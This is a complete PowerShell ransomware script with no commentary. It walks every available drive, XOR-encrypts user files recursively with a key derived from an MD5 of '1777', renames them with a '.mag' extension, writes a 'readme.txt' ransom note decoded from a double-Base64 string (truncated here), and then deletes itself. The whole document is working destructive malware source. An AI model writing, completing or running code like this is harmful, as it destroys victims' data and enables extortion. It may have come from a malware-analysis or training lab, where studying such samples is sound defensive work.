function Decode-Base64-Twice {
    param (
        [string]$Base64String
    )
    try {
        $FirstDecoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Base64String))
        $SecondDecoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($FirstDecoded))
        return $SecondDecoded
    } catch {
        Write-Host "Failed to decode Base64 string. Ensure the input is valid." -ForegroundColor Red
        return $null
    }
}

function Create-RansomNote {
    param (
        [string]$TargetDirectory,
        [string]$NoteContent
    )
    $NotePath = Join-Path -Path $TargetDirectory -ChildPath "readme.txt"
    [System.IO.File]::WriteAllText($NotePath, $NoteContent)
    Write-Host "Ransom note created: $NotePath" -ForegroundColor Green
}

function XOR-EncryptDecrypt {
    param (
        [byte[]]$Data,
        [string]$Key
    )
    $KeyLength = $Key.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $Data[$i] = $Data[$i] -bxor [byte][char]$Key[$i % $KeyLength]
    }
    return $Data
}

function XOR-File {
    param (
        [string]$FilePath,
        [string]$Key
    )
    $Data = [System.IO.File]::ReadAllBytes($FilePath)
    $EncryptedData = XOR-EncryptDecrypt -Data $Data -Key $Key
    [System.IO.File]::WriteAllBytes($FilePath, $EncryptedData)
}

function Generate-MD5-Hash {
    param (
        [string]$Value
    )
    $MD5 = [System.Security.Cryptography.MD5]::Create()
    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Value)
    $HashBytes = $MD5.ComputeHash($Bytes)
    $Hash = [BitConverter]::ToString($HashBytes) -replace "-", ""
    return $Hash.ToLower()
}

function Derive-EncryptionKey {
    $HashValue = Generate-MD5-Hash -Value "1777"
    $DerivedKey = $HashValue.Substring($HashValue.Length - 4, 4)
    return $DerivedKey
}

function Validate-ExecutionKey {
    param (
        [string]$ExecutionKey
    )
    if ($ExecutionKey -ne "1777") {
        Write-Host "Invalid execution key! The script will not proceed." -ForegroundColor Red
        return $false
    }
    return $true
}

function Get-AvailableDrives {
    $Drives = @()
    foreach ($Drive in ([char]'A'..[char]'Z')) {
        $Path = "${Drive}:\"
        if (Test-Path -Path $Path) {
            $Drives += $Path
        }
    }
    return $Drives
}

function Encrypt-Files {
    param (
        [string]$EncryptionKey,
        [string[]]$TargetDirectories,
        [string[]]$ExcludedDirectories
    )

    # Write an indicator file to the root directory of each target
    $IndicatorFile = "C:\encryption_indicator.txt"
    Add-Content -Path $IndicatorFile -Value "Encryption started at $(Get-Date)" -Force

    Write-Host "=== Encryption Process Started ===" -ForegroundColor Red

    foreach ($TargetDirectory in $TargetDirectories) {
        Write-Host "Processing directory: $TargetDirectory" -ForegroundColor Yellow
        Get-ChildItem -Path $TargetDirectory -Recurse -File | ForEach-Object {
            $FilePath = $_.FullName
            $Excluded = $ExcludedDirectories | Where-Object { $FilePath.StartsWith($_) }
            if ($Excluded) {
                Write-Host "Skipped system/critical file: $FilePath" -ForegroundColor DarkYellow
                return
            }
            $NewFilePath = "${FilePath}.mag"
            try {
                XOR-File -FilePath $FilePath -Key $EncryptionKey
                Rename-Item -Path $FilePath -NewName $NewFilePath
                Write-Host "Encrypted: $NewFilePath" -ForegroundColor Cyan
            } catch {
                Write-Host "Failed to encrypt ${FilePath}: $_" -ForegroundColor Yellow
            }
        }

        # Create a ransom note in the directory
        Create-RansomNote -TargetDirectory $TargetDirectory -NoteContent $DecodedNote
    }

    Write-Host "=== Encryption Process Completed ===" -ForegroundColor Green

    # Append to the indicator file
    Add-Content -Path $IndicatorFile -Value "Encryption completed at $(Get-Date)" -Force
}

function Self-Delete {
    param (
        [string]$ScriptPath = $MyInvocation.MyCommand.Path
    )

    if (-not $ScriptPath) {
        Write-Host "Script path is null. Self-delete cannot proceed." -ForegroundColor Yellow
        return
    }

    try {
        Remove-Item -Path $ScriptPath -Force
        Write-Host "Script $ScriptPath has been deleted." -ForegroundColor Green
    } catch {
        Write-Host "Failed to delete script: $_" -ForegroundColor Yellow
    }
}

function Main {
    param (
        [string]$ExecutionKey
    )

    if (-not (Validate-ExecutionKey -ExecutionKey $ExecutionKey)) {
        return
    }

    # Replace with a valid Base64 string
    $Base64String = "SVNFaElFOVBVRk1zSUZkRklF..."

    $DecodedNote = Decode-Base64-Twice -Base64String $Base64String
    if ($DecodedNote -eq $null) {
        Write-Host "Exiting script due to invalid Base64 note." -ForegroundColor Red
        return
    }

    $EncryptionKey = Derive-EncryptionKey

    # Get all available drives
    $AvailableDrives = Get-AvailableDrives

    # Define excluded directories (adjust as needed)
    $ExcludedDirectories = @(
        "C:\Windows",
        "C:\Program Files",
        "C:\Program Files (x86)",
        "C:\Users\Default",
        "C:\Users\Public",
        "C:\Users\$($env:USERNAME)\AppData"
    )

    Encrypt-Files -EncryptionKey $EncryptionKey -TargetDirectories $AvailableDrives -ExcludedDirectories $ExcludedDirectories

    # Pass the script's path explicitly
    Self-Delete -ScriptPath $MyInvocation.MyCommand.Path
}

# Execute the script with the provided execution key
Main -ExecutionKey $args[0]
